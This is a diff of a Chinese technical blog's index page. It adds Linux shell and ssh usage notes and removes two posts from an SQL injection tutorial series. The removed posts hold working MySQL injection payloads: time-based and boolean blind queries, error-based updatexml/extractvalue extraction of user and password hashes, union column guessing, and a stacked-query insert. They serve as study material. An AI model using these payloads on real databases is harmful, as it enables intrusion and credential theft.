@@ -194,6 +194,375 @@
           
           
             
+              <a class="post-title-link" href="/2015/09/06/shell命令使用记录/" itemprop="url">
+                shell命令使用记录
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-09-06T09:10:37+08:00" content="2015-09-06">
+            2015-09-06
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/09/06/shell命令使用记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/06/shell命令使用记录/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="chmod改变文件权限">chmod改变文件权限</h2><p>a:allusers<br>u:user<br>g:guest<br>o:other</p>
+<pre><code>shell&gt; chmod a+rwx test.bin
+<span class="preprocessor">#为 <span class="number">1.u</span>ser当前用户<span class="number">2.</span>group当前用户组<span class="number">3.</span>other其他用户 添加rwx权限</span>
+shell&gt; chmod go-wx test.bin
+<span class="preprocessor">#移除g和o组的wx权限</span>
+</code></pre><h2 id="查看当前linux版本">查看当前linux版本</h2><pre><code><span class="built_in">shell</span>&gt; uname -r
+<span class="comment">#查看实际内核版本及系统位数</span>
+<span class="built_in">shell</span>&gt; lsb_release -<span class="operator">a</span>
+<span class="comment">#显示系统详细信息</span>
+</code></pre><h2 id="删除目录">删除目录</h2><pre><code><span class="built_in">shell</span>&gt; rmdir temp
+<span class="comment">#删除空目录</span>
+<span class="built_in">shell</span>&gt; rm -rf temp
+<span class="comment">#f强制r递归删除目录 危险操作!!!</span>
+</code></pre><h2 id="进程管理">进程管理</h2><pre><code><span class="keyword">ps</span>命令查找与进程相关的PID号：
+<span class="keyword">ps</span> <span class="keyword">a</span> 显示现行终端机下的所有程序，包括其他用户的程序。 
+<span class="keyword">ps</span> -A 显示所有程序。 
+<span class="keyword">ps</span> <span class="keyword">c</span> 列出程序时，显示每个程序真正的指令名称，而不包含路径，参数或常驻服务的标示。 
+<span class="keyword">ps</span> -<span class="keyword">e</span> 此参数的效果和指定<span class="string">"A"</span>参数相同。 
+<span class="keyword">ps</span> <span class="keyword">e</span> 列出程序时，显示每个程序所使用的环境变量。 
+<span class="keyword">ps</span> <span class="keyword">f</span> 用ASCII字符显示树状结构，表达程序间的相互关系。 
+<span class="keyword">ps</span> -H 显示树状结构，表示程序间的相互关系。 
+<span class="keyword">ps</span> -<span class="keyword">N</span> 显示所有的程序，除了执行<span class="keyword">ps</span>指令终端机下的程序之外。 
+<span class="keyword">ps</span> <span class="keyword">s</span> 采用程序信号的格式显示程序状况。 
+<span class="keyword">ps</span> S 列出程序时，包括已中断的子程序资料。 
+<span class="keyword">ps</span> -<span class="keyword">t</span>&lt;终端机编号&gt; 指定终端机编号，并列出属于该终端机的程序的状况。 
+<span class="keyword">ps</span> <span class="keyword">u</span> 以用户为主的格式来显示程序状况。 
+<span class="keyword">ps</span> <span class="keyword">x</span> 显示所有程序，不以终端机来区分。
+
+<span class="keyword">shell</span>&gt; kill PID
+<span class="keyword">shell</span>&gt; killall -<span class="number">9</span> NAME
+</code></pre><h2 id="内存情况">内存情况</h2><pre><code>shell&gt; free
+<span class="comment">#单位为kb</span>
+shell&gt; cat /<span class="keyword">proc</span>/meminfo
+shell&gt; top
+<span class="comment">#内存实时占用情况</span>
+</code></pre><h2 id="top命令">top命令</h2><pre><code>shell&gt; top
+top - <span class="number">02</span>:<span class="number">53</span>:<span class="number">32</span> up <span class="number">16</span> days,  <span class="number">6</span>:<span class="number">34</span>, <span class="number">17</span> users,  load average: <span class="number">0.24</span>, <span class="number">0.21</span>, <span class="number">0.24</span>
+Tasks: <span class="number">481</span> total,   <span class="number">3</span> running, <span class="number">474</span> sleeping,   <span class="number">0</span> stopped,   <span class="number">4</span> <span class="function">zombie
+<span class="title">Cpu</span><span class="params">(s)</span>: 10.3%us,  1.8%sy,  0.0%ni, 86.6%id,  0.5%wa,  0.2%hi,  0.6%si,  0.0%st
+Mem:   4042764k total,  4001096k used,    41668k <span class="built_in">free</span>,   383536k buffers
+Swap:  2104472k total,     7900k used,  2096572k <span class="built_in">free</span>,  1557040k cached
+
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND    
+32497 jacky     20   0  669m 222m  31m R   10  5.6       29:27.62 firefox
+4788 yiuwing   20   0  257m  18m  13m S    5  0.5          5:42.44 konsole
+ 5657 Liuxiaof  20   0  585m 159m  30m S    4  4.0          5:25.06 firefox
+ 4455 xiefc      20   0  542m  124m  30m R    4  3.1         7:23.03 firefox
+ 6188 Liuxiaof  20   0  191m   17m  13m S    4  0.5          0:01.16 konsole</span>
+</code></pre><p>统计信息区前五行是系统整体的统计信息。第一行是任务队列信息，同 uptime  命令的执行结果。其内容如下：</p>
+<p>01:06:48  当前时间<br>up 1:22  系统运行 时间，格式为时:分<br>1 user  当前登录用户 数<br>load average: 0.06, 0.60, 0.48  系统负载 ，即任务队列的平均长度。<br>三个数值分别为  1分钟、5分钟、15分钟前到现在的平均值。 </p>
+<p>第二、三行为进程和CPU的信息。当有多个CPU时，这些内容可能会超过两行。内容如下：</p>
+<pre><code>Tasks: <span class="number">29</span> total  进程总数  
+<span class="number">1</span> running  正在运行的进程数  
+<span class="number">28</span> sleeping  睡眠的进程数  
+<span class="number">0</span> stopped  停止的进程数  
+<span class="number">0</span> zombie  僵尸进程数  
+Cpu(s): <span class="number">0.3</span>% us  用户空间占用CPU百分比  
+<span class="number">1.0</span>% sy  内核 空间占用CPU百分比  
+<span class="number">0.0</span>% ni  用户进程空间内改变过优先级的进程占用CPU百分比  
+<span class="number">98.7</span>% id  空闲CPU百分比  
+<span class="number">0.0</span>% wa  等待输入输出的CPU时间百分比  
+<span class="number">0.0</span>% hi     
+<span class="number">0.0</span>% si    
+</code></pre><p>最后两行为内存 信息。内容如下：</p>
+<pre><code>Mem: <span class="number">191272</span>k total  物理内存总量  
+<span class="number">173656</span>k used  使用的物理内存总量  
+<span class="number">17616</span>k <span class="built_in">free</span>  空闲内存总量  
+<span class="number">22052</span>k buffers  用作内核缓存 的内存量  
+Swap: <span class="number">192772</span>k total  交换区总量  
+<span class="number">0</span>k used  使用的交换区总量  
+<span class="number">192772</span>k <span class="built_in">free</span>  空闲交换区总量  
+<span class="number">123988</span>k cached  缓冲的交换区总量。
+内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，
+该数值即为这些内容已存在于内存中 的交换区的大小。
+相应的内存再次被换出时可不必再对交换区写入。 
+</code></pre><p>进程信息区统计信息区域的下方显示了各个进程的详细信息。首先来认识一下各列的含义。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">序号</th>
+<th>列名</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">a</td>
+<td>PID</td>
+<td>进程id</td>
+</tr>
+<tr>
+<td style="text-align:left">b</td>
+<td>PPID</td>
+<td>父进程id</td>
+</tr>
+<tr>
+<td style="text-align:left">c</td>
+<td>RUSER</td>
+<td>Real user name</td>
+</tr>
+<tr>
+<td style="text-align:left">d</td>
+<td>UID</td>
+<td>进程所有者的用户id</td>
+</tr>
+<tr>
+<td style="text-align:left">e</td>
+<td>USER</td>
+<td>进程所有者的用户名</td>
+</tr>
+<tr>
+<td style="text-align:left">f</td>
+<td>GROUP</td>
+<td>进程所有者的组名</td>
+</tr>
+<tr>
+<td style="text-align:left">g</td>
+<td>TTY</td>
+<td>启动进程的终端名。不是从终端启动的进程则显示为 ?</td>
+</tr>
+<tr>
+<td style="text-align:left">h</td>
+<td>PR</td>
+<td>优先级</td>
+</tr>
+<tr>
+<td style="text-align:left">i</td>
+<td>NI</td>
+<td>nice值。负值表示高优先级，正值表示低优先级</td>
+</tr>
+<tr>
+<td style="text-align:left">j</td>
+<td>P</td>
+<td>最后使用的CPU，仅在多CPU环境 下有意义</td>
+</tr>
+<tr>
+<td style="text-align:left">k</td>
+<td>%CPU</td>
+<td>上次更新到现在的CPU时间占用百分比</td>
+</tr>
+<tr>
+<td style="text-align:left">l</td>
+<td>TIME</td>
+<td>进程使用的CPU时间总计，单位秒</td>
+</tr>
+<tr>
+<td style="text-align:left">m</td>
+<td>TIME+</td>
+<td>进程使用的CPU时间总计，单位1/100秒</td>
+</tr>
+<tr>
+<td style="text-align:left">n</td>
+<td>%MEM</td>
+<td>进程使用的物理内存 百分比</td>
+</tr>
+<tr>
+<td style="text-align:left">o</td>
+<td>VIRT</td>
+<td>进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</td>
+</tr>
+<tr>
+<td style="text-align:left">p</td>
+<td>SWAP</td>
+<td>进程使用的虚拟内存中，被换出的大小，单位kb。</td>
+</tr>
+<tr>
+<td style="text-align:left">q</td>
+<td>RES</td>
+<td>进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</td>
+</tr>
+<tr>
+<td style="text-align:left">r</td>
+<td>CODE</td>
+<td>可执行代码占用的物理 内存大小，单位kb</td>
+</tr>
+<tr>
+<td style="text-align:left">s</td>
+<td>DATA</td>
+<td>可执行代码以外的部分(数据 段+栈)占用的物理 内存大小，单位kb</td>
+</tr>
+<tr>
+<td style="text-align:left">t</td>
+<td>SHR</td>
+<td>共享内存大小，单位kb</td>
+</tr>
+<tr>
+<td style="text-align:left">u</td>
+<td>nFLT</td>
+<td>页面错误次数</td>
+</tr>
+<tr>
+<td style="text-align:left">v</td>
+<td>nDRT</td>
+<td>最后一次写入到现在，被修改过的页面数。</td>
+</tr>
+<tr>
+<td style="text-align:left">w</td>
+<td>S</td>
+<td>进程状态。D =不可中断的睡眠状态R =运行S =睡眠T =跟踪/停止Z =僵尸进程</td>
+</tr>
+<tr>
+<td style="text-align:left">x</td>
+<td>COMMAND</td>
+<td>命令名/命令行</td>
+</tr>
+<tr>
+<td style="text-align:left">y</td>
+<td>WCHAN</td>
+<td>若该进程在睡眠，则显示睡眠中的系统函数名</td>
+</tr>
+<tr>
+<td style="text-align:left">z</td>
+<td>Flags</td>
+<td>任务标志，参考 sched.h</td>
+</tr>
+</tbody>
+</table>
+<p>默认情况下仅显示比较重要的  PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND  列。可以通过下面的快捷键来更改显示内容。<br>更改显示内容通过 f 键可以选择显示的内容。按 f 键之后会显示列的列表，按 a-z  即可显示或隐藏对应的列，最后按回车键确定。<br>按 o 键可以改变列的显示顺序。按小写的 a-z 可以将相应的列向右移动，而大写的 A-Z  可以将相应的列向左移动。最后按回车键确定。<br>按大写的 F 或 O 键，然后按 a-z 可以将进程按照相应的列进行排序。而大写的  R 键可以将当前的排序倒转。</p>
+<h2 id="查看用户">查看用户</h2><pre><code><span class="built_in">shell</span>&gt;cat etc/passwd <span class="comment">#用户的配置信息</span>
+<span class="built_in">shell</span>&gt;cat etc/groups <span class="comment">#用户组的配置信息</span>
+</code></pre><p><a href="http://blog.csdn.net/dchjmichael/article/details/8968546" target="_blank" rel="external">linux用户管理详解</a></p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/09/02/putty使用记录/" itemprop="url">
+                ssh使用记录
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-09-02T11:46:05+08:00" content="2015-09-02">
+            2015-09-02
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/09/02/putty使用记录/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/02/putty使用记录/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="putty命令终端中文乱码问题">putty命令终端中文乱码问题</h2><p>标题栏左上角图标-&gt;Change Setting-&gt;Translation-&gt;character set -&gt;UTF-8</p>
+<h2 id="传输文件">传输文件</h2><p>我的做法是将putty所在目录设置到环境变量中<br>这样就可以使用pscp和psftp传输文件了</p>
+<p>windows-&gt;linux</p>
+<pre><code>pscp 目标文件 root<span class="variable">@192</span>.<span class="number">168</span>.***.***<span class="symbol">:/home/quanyong</span>
+
+psftp <span class="number">192.168</span>.<span class="number">101.213</span>
+cd到目标目录
+put 目标文件
+
+<span class="comment">#使用ssh命令行</span>
+scp -rp /path/filename username<span class="variable">@remoteIP</span><span class="symbol">:/path</span> <span class="comment">#将本地文件拷贝到服务器上</span>
+scp -rp username<span class="variable">@remoteIP</span><span class="symbol">:/path/filename</span> /path <span class="comment">#将远程文件从服务器下载到本地</span>
+</code></pre></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/09/02/Vim练级攻略/" itemprop="url">
                 Vim练级攻略
               </a>
@@ -1236,270 +1605,11 @@ mysql&gt; <span class="keyword">select</span> <span class="number">1</span> <spa
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="url">
-                SQL注入练级攻略(5)-5种注入类型
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-13T09:42:10+08:00" content="2015-08-13">
-            2015-08-13
-          </time>
-        </span>
-
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
-                  <span itemprop="name">SLQ注入练级系列</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="基于布尔的盲注">基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
-mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;<span class="comment">//根据返回内容的真假判断是否存在注入</span>
-</code></pre><h2 id="基于时间的盲注">基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
-mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>=<span class="number">114</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
-<span class="comment">//如果if中条件成立返回延时.</span>
-<span class="comment">//BENCHMARK(100000,SHA1('true'))替代sleep(3)，前者在mysql 4/5适用，后者在mysql 5 适用.</span>
-</code></pre><h2 id="基于报错的注入">基于报错的注入</h2><p>-rand和group的冲突</p>
-<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(left(<span class="built_in">rand</span>(),<span class="number">3</span>),version())x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)b;
-
-mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
-
-<span class="comment">//x的语句为:concat_ws(":",user(),version(),floor(rand(0)*2)),rand()是不允许放在group by之后的所以用group by x 之后报错 显示出 user，version信息</span>
-</code></pre><p>遇到的问题：<br>1.如果想用报错注入显示database()信息时，不能为NULL，必须使用use databasename；选择一个数据库。<br>2.注意上述语句中使用 union 和 and 的区别 一个括号。<br>3.floor(rand(0)x2)其中乘以三乘以4都是可以的，2是一个习惯用法。<br>4.除了floor(rand(0)x3)，使用left(rand(),3)之类不确定的数值跟在group by之后也是可以报错的。</p>
-<p>-extractvalue注入</p>
-<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user=<span class="string">"test"</span> <span class="function">and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>, concat(<span class="number">0x7e</span>,@@version</span>))</span>;
-<span class="comment">//0x7e对应 ~</span>
-</code></pre><p>说明：<br>1.extractvalue函数是用来获取xml中的数据extractvalue(pram1,pram2)<br>2.在pram2的部分正常情况下应该填写路径，在这里我们构造了extractvalue(1, concat(0x7e,@@version))，系统报错显示了我们构造部分的内容<br>3.获取内容有长度限制,最长32位。</p>
-<p>-UpdateXML()注入</p>
-<pre><code>mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT distinct concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>);
-//<span class="number">0</span>x7e对应 ~
-mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,a,<span class="number">1</span>);//上述语句简化
-
-//a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
-//对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
-</code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.获取内容有长度限制,最长32位。</p>
-<h2 id="联合查询注入">联合查询注入</h2><p>绕过了union和select基本就可以干所有的事情了<br>1.最基本的查询其他内容    </p>
-<pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin2 <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> username <span class="keyword">from</span> admin;
-</code></pre><p>2.猜解字段数：</p>
-<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>..from admin;
-<span class="comment">//知道返回正常就说明有几个字段</span>
-</code></pre><p>3.猜解字段</p>
-<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,<span class="number">5.</span>..from admin
-<span class="comment">//猜解username字段是否存在</span>
-</code></pre><h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
-<pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
-mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> user=root and <span class="number">1</span>=<span class="number">0</span>; <span class="function">insert <span class="title">into</span> (<span class="params">username,password</span>) <span class="title">VALUES</span> (<span class="params"><span class="string">'BobbyTables'</span>, <span class="string">'kl20da$$'</span></span>)</span>;
-<span class="comment">//可以同时执行多个语句</span>
-</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/12/SQL注入练级攻略-4-数据库常量及函数/" itemprop="url">
-                SQL注入练级攻略(4)-数据库常量及函数
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-12T11:39:35+08:00" content="2015-08-12">
-            2015-08-12
-          </time>
-        </span>
-
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
-                  <span itemprop="name">SLQ注入练级系列</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/12/SQL注入练级攻略-4-数据库常量及函数/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/12/SQL注入练级攻略-4-数据库常量及函数/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="常量"><h1>常量</h1></h2><h2 id="version">version</h2><pre><code>VERSION()
-@@VERSION
-@@<span class="keyword">GLOBAL</span>.VERSION
-mysql&gt; <span class="keyword">select</span> @@version;<span class="comment">//显示mysql版本</span>
-mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> <span class="number">1</span> <span class="keyword">and</span> mid(version(),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">5</span>;<span class="comment">//当数据库版本为5.x.xx时返回为真</span>
-</code></pre><h2 id="user">user</h2><pre><code>user()
-<span class="function">current_user
-<span class="title">current_user</span>(<span class="params"></span>)
-<span class="title">system_user</span>(<span class="params"></span>)
-<span class="title">session_user</span>(<span class="params"></span>)
-mysql&gt; <span class="keyword">select</span> <span class="title">user</span>(<span class="params"></span>)</span>; <span class="comment">//显示当前用户</span>
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat_ws</span>(<span class="params"><span class="string">":"</span>,user,password</span>) <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user </span>= <span class="string">"root"</span>; <span class="comment">//显示 root:"对应用户密码散列值"</span>
-</code></pre><h2 id="database">database</h2><pre><code>database()
-schema()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;<span class="comment">//显示mysql</span>
-<span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;<span class="comment">//显示所有数据库</span>
-</code></pre><h2 id="hostname">hostname</h2><pre><code>@<span class="variable">@hostname</span>
-mysql&gt; select <span class="variable">@@hostname</span>;
-</code></pre><h2 id="datadir">datadir</h2><pre><code>@<span class="variable">@datadir</span>
-mysql&gt; select <span class="variable">@@datadir</span>;
-<span class="comment">//data绝对路径</span>
-</code></pre><h2 id="current_timestamp">current_timestamp</h2><pre><code>current_timestamp
-mysql&gt; <span class="keyword">select</span> current_timestamp;<span class="comment">//当前时间</span>
-</code></pre><h2 id="uuid()">uuid()</h2><pre><code>uuid()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">uuid</span>(<span class="params"></span>)</span>;
-</code></pre><h2 id="函数"><h1>函数</h1></h2><h2 id="length">length</h2><pre><code><span class="built_in">length</span>()
-mysql&gt; <span class="keyword">select</span> <span class="built_in">length</span>(<span class="string">"abc"</span>);<span class="comment">//字符串长度</span>
-</code></pre><h2 id="mid">mid</h2><pre><code>mid()
-mysql&gt; <span class="function">select <span class="title">mid</span><span class="params">(<span class="string">"abc"</span>,<span class="number">1</span>,<span class="number">1</span>)</span></span>;<span class="comment">//指定字符串</span>
-</code></pre><h2 id="if,case">if,case</h2><pre><code><span class="keyword">if</span>()
-mysql&gt; <span class="keyword">select</span> <span class="keyword">if</span>(length(user())&gt;<span class="number">10</span>,sleep(<span class="number">3</span>),<span class="number">0</span>);//<span class="keyword">if</span>成立返回sleep(<span class="number">3</span>)
-<span class="keyword">case</span>
-mysql <span class="keyword">select</span> <span class="keyword">case</span> when <span class="number">1</span>=<span class="number">1</span> <span class="keyword">then</span> <span class="literal">true</span> <span class="keyword">else</span> <span class="literal">false</span> <span class="keyword">end</span>;
-//<span class="keyword">if</span>相似
-</code></pre><h2 id="ascii">ascii</h2><pre><code>ascii<span class="params">()</span>
-mysql&gt; select ascii<span class="params">(<span class="string">"abcb"</span>)</span><span class="comment">//返回a的ascii码97</span>
-mysql&gt; select ascii<span class="params">(mid<span class="params">(<span class="string">"abcb"</span>,<span class="number">2</span>,<span class="number">1</span>)</span>)</span>;<span class="comment">//返回b的ascii码98</span>
-</code></pre><h2 id="count">count</h2><pre><code><span class="built_in">count</span>()
-mysql&gt; <span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> mysql.user;<span class="comment">//返回记录条数</span>
-</code></pre><h2 id="concat,concat_ws">concat,concat_ws</h2><pre><code>concat()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat</span>(<span class="params"><span class="string">"a"</span>,<span class="string">"b"</span></span>)</span>;<span class="comment">//显示ab</span>
-
-concat_ws()
-mysql&gt; <span class="function"><span class="keyword">select</span> <span class="title">concat_ws</span>(<span class="params"><span class="string">":"</span>,user,password</span>) <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user </span>= <span class="string">"root"</span>; <span class="comment">//显示 root:"对应用户密码散列值"</span>
-</code></pre><h2 id="rand">rand</h2><pre><code><span class="keyword">rand</span>()
-mysql&gt; <span class="keyword">select</span> <span class="keyword">rand</span>();<span class="comment">//0~1之间的随机数</span>
-</code></pre><h2 id="floor">floor</h2><pre><code><span class="built_in">floor</span><span class="params">()</span>
-mysql&gt; select <span class="built_in">floor</span><span class="params">(<span class="number">1.1</span>)</span>;<span class="comment">//向下取整</span>
-</code></pre><h2 id="group_by">group_by</h2><pre><code><span class="built_in">group</span> <span class="keyword">by</span>()
-mysql&gt; <span class="keyword">select</span> <span class="built_in">type</span>,<span class="built_in">max</span>(price) <span class="keyword">from</span> price_info <span class="built_in">group</span> <span class="keyword">by</span> <span class="built_in">type</span>;
-<span class="comment">//先按tpye分组，建立若干临时表，然后在每一个临时表示执行max()函数</span>
-</code></pre><h2 id="distinct">distinct</h2><pre><code><span class="keyword">distinct</span>()
-mysql&gt; select <span class="keyword">distinct</span> user <span class="keyword">from</span> mysql.user;
-//排重，只显示不重复的user.
-</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/">&laquo;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">&raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/3/">&laquo;</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/">&raquo;</a>
   </nav>
 
  </div>
@@ -1533,7 +1643,7 @@ mysql&gt; select <span class="keyword">distinct</span> user <span class="keyword
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
